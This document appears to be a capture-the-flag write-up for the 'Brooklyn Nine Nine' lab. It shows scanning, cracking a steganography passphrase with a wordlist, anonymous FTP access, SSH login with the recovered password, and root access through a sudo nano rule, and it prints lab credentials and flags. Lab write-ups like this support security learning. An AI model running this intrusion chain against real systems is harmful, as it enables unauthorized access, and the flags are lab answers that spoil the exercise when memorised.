``ip:`` 10.10.210.113

## Enumeration
#### Nmap
```r
nmap -sV -sC 10.10.210.113 -p- --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-29 22:03 EST
Nmap scan report for 10.10.210.113
Host is up (0.12s latency).
Not shown: 64850 closed tcp ports (reset), 682 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.198.175
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results 
```
``Found:``
- A vulnerable FTP server that accepts ``"Anonymous"`` login
- SSH server running on port 22
- Vulnerable HTTP Server running port 80

Let us visit the webpage on port 80

### Website enumeration:
Nothing much to see on the "Homepage", just the movie picture and something about the picture scaling to the browser's screen size.
Let's check the source code:
We found something:
```r
</style>
</head>
<body>

<div class="bg"></div>

<p>This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.</p>
<!-- Have you ever heard of steganography? -->
</body>
</html>
```
Stenography? What is that?
_Steganography is the technique of hiding data within an ordinary, nonsecret file or message to avoid detection; the hidden data is then extracted at its destination. Steganography use can be combined with encryption as an extra step for hiding or protecting data._
Something to think about going forth: 

#### Gobuster
Let us use an automated tool called gobuster to brute force sub domains on our target webpage
```r
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://brooklyn99.thm
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://brooklyn99.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 61222 / 87665 (69.84%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 61236 / 87665 (69.85%)
===============================================================
Finished
===============================================================
```
Nothing in Gobuster.

Let us go back to the stenography stuff. By using Gobuster we were not able to find an image sub domains but we see that the website has a picture as it's cover page.

Let us save that picture as ``brooklyn99.jpg`` and use ``stegseek`` to analyze it for hidden files and folders. You can install stegseek by using this command: ``sudo apt install stegseek``

### Stenography 
Using stegseek: 
```r
stegseek --crack -sf ~/Pictures/brooklyn99.jpg -wl /usr/share/wordlists/rockyou.txt -xf steg.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "steg.txt".
```
We use the ``--crack ``option to brute-force for secrets and hidden files using the ``rockyou.txt`` wordlist and save the results in a text file called ``steg.txt``.

Let open steg.txt to view contents:
```r
cat steg.txt 
Holts Password:
fluffydog12@ninenine

Enjoy!!
```
``Credentials:`` ``username``: Holts and ``password``: fluffydog12@ninenine

### FTP
Remember the vulnerable ftp server. Let us go and actively enumerate it.
```r
ftp brooklyn99.thm
Connected to brooklyn99.thm.
220 (vsFTPd 3.0.3)
Name (brooklyn99.thm:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||36069|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
```
While enumerating the ftp server, we found a note ``"note_to_jake.txt"``. Let's download that file to our host machine and view the content.
```r
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||62183|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |*********************************************************|   119        1.89 MiB/s    00:00 ETA
226 Transfer complete.
```

```r
cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
Wow, we found three user:
- Holt
- Jake
- Amy

Let us quickly login into the target machine before holts does.

### SSH
```r
ssh holt@10.10.210.113
holt@10.10.210.113's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ 

```
We are in Holt's account. ``{COMPROMISED}``

Right from his desktop we can get the user.txt flag
```r
holt@brookly_nine_nine:~$ ls -l
total 8
-rw------- 1 root root 110 May 18  2020 nano.save
-rw-rw-r-- 1 holt holt  33 May 17  2020 user.txt
holt@brookly_nine_nine:~$ cat user.txt 
ee11cbb19052e40b07aac0ca060c23ee
```

## Privilege Escalation
I look everything including crontab, .ssh keys but nothing to show how to escalate my privileges, not unless I ran ``sudo -l``

```r
holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```
The Holt user can actually run as ``root`` with no password through ``/bin/nano``. ``{Vulnerability}``

Let us use ``GTO bins`` to find the appropriate commands to get root privileges.

Since he can use nano without restrictions, then let's open the root.txt file by using 
```r
holt@brookly_nine_nine:~$ sudo nano /root/root.txt
```

```r
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```

